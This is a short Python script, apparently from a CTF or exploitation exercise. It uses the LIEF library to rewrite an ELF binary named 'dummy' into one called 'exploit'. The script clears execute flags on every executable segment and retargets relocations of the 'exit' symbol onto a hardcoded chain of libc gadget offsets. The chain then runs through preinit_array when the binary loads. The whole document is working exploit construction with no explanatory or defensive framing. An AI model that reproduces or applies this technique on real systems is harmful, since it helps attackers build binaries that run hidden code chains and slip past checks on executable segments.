#!/usr/bin/env python
import lief
import struct

# gadget offsets within libc
chain = [
    0x110970,
    0xfd527,
    0x121b30,
    0xfd527,
    0xfd527,
    0xfd527,
    0xfd527,
    0xfd527,
    0xfd527,
    0xfd527,
    0xfd527,
    0xfd527,
    0xfd527,
    0xfd527,
    0x1164b0,
    0x800b0,
    0x2e786,
    0x809c0,
]
# import offset within libc
exit_offset = 0x43120

binary = lief.parse('./dummy')

# Remove executable bits
for seg in binary.segments:
    if seg.flags & lief.ELF.SEGMENT_FLAGS.X:
        seg.flags = lief.ELF.SEGMENT_FLAGS.R

# Modify preinit_array relocations
idx = 0
for reloc in binary.relocations:
    if reloc.symbol.name != 'exit':
        continue
    reloc.addend = chain[idx] - exit_offset
    idx += 1
    if idx == len(chain):
        break

binary.write('./exploit')
